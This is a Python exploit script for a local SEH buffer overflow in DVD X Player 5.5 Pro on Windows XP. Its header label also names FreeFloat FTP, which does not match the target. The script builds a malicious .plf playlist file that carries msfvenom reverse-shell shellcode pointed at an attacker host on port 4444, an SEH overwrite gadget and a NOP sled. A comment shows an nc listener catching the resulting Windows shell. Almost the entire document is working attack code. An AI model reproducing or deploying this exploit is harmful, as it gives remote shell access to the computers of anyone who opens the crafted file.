#!/usr/bin/env python

# ---------------------------------------------
# Exploit: FreeFloat FTP (DVD X Player 5.5 Pro SEH (local BOF)
# OS: WinXP Pro SP3
# Author: lucyoa
# ---------------------------------------------
# root@b00m:~# nc -lvp 4444
# listening on [any] 4444 ...
# 172.20.10.7: inverse host lookup failed: Unknown host
# connect to [172.20.10.4] from (UNKNOWN) [172.20.10.7] 1040
# Microsoft Windows XP [Wersja 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
# 
# F:\>
# ---------------------------------------------


def main():
    # msfvenom -p windows/shell_reverse_tcp LHOST=172.20.10.4 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0d\x0a\x1a' -f c
    pay = ("\xb8\x28\xaa\x16\xdc\xda\xc8\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
    "\x52\x31\x42\x12\x03\x42\x12\x83\xea\xae\xf4\x29\x16\x46\x7a"
    "\xd1\xe6\x97\x1b\x5b\x03\xa6\x1b\x3f\x40\x99\xab\x4b\x04\x16"
    "\x47\x19\xbc\xad\x25\xb6\xb3\x06\x83\xe0\xfa\x97\xb8\xd1\x9d"
    "\x1b\xc3\x05\x7d\x25\x0c\x58\x7c\x62\x71\x91\x2c\x3b\xfd\x04"
    "\xc0\x48\x4b\x95\x6b\x02\x5d\x9d\x88\xd3\x5c\x8c\x1f\x6f\x07"
    "\x0e\x9e\xbc\x33\x07\xb8\xa1\x7e\xd1\x33\x11\xf4\xe0\x95\x6b"
    "\xf5\x4f\xd8\x43\x04\x91\x1d\x63\xf7\xe4\x57\x97\x8a\xfe\xac"
    "\xe5\x50\x8a\x36\x4d\x12\x2c\x92\x6f\xf7\xab\x51\x63\xbc\xb8"
    "\x3d\x60\x43\x6c\x36\x9c\xc8\x93\x98\x14\x8a\xb7\x3c\x7c\x48"
    "\xd9\x65\xd8\x3f\xe6\x75\x83\xe0\x42\xfe\x2e\xf4\xfe\x5d\x27"
    "\x39\x33\x5d\xb7\x55\x44\x2e\x85\xfa\xfe\xb8\xa5\x73\xd9\x3f"
    "\xc9\xa9\x9d\xaf\x34\x52\xde\xe6\xf2\x06\x8e\x90\xd3\x26\x45"
    "\x60\xdb\xf2\xca\x30\x73\xad\xaa\xe0\x33\x1d\x43\xea\xbb\x42"
    "\x73\x15\x16\xeb\x1e\xec\xf1\xb8\xcb\xe4\x05\xa9\xf1\xf8\x14"
    "\x75\x7f\x1e\x7c\x95\x29\x89\xe9\x0c\x70\x41\x8b\xd1\xae\x2c"
    "\x8b\x5a\x5d\xd1\x42\xab\x28\xc1\x33\x5b\x67\xbb\x92\x64\x5d"
    "\xd3\x79\xf6\x3a\x23\xf7\xeb\x94\x74\x50\xdd\xec\x10\x4c\x44"
    "\x47\x06\x8d\x10\xa0\x82\x4a\xe1\x2f\x0b\x1e\x5d\x14\x1b\xe6"
    "\x5e\x10\x4f\xb6\x08\xce\x39\x70\xe3\xa0\x93\x2a\x58\x6b\x73"
    "\xaa\x92\xac\x05\xb3\xfe\x5a\xe9\x02\x57\x1b\x16\xaa\x3f\xab"
    "\x6f\xd6\xdf\x54\xba\x52\xef\x1e\xe6\xf3\x78\xc7\x73\x46\xe5"
    "\xf8\xae\x85\x10\x7b\x5a\x76\xe7\x63\x2f\x73\xa3\x23\xdc\x09"
    "\xbc\xc1\xe2\xbe\xbd\xc3")

    # 0x6164172e : pop ecx # pop ecx # ret 0x08 | asciiprint,ascii {PAGE_EXECUTE_READ} [EPG.dll]
    seh = "\x2e\x17\x64\x61"

    # jmp 4 bytes
    nseh = "\x90\x90\xeb\x04"

    payload = "\x90" * 608 + nseh + seh + "\x90"*20 + pay

    filename = "payload.plf"
    f = open(filename, 'w+')
    f.write(payload)
    f.close()


if __name__ == "__main__":
    main()
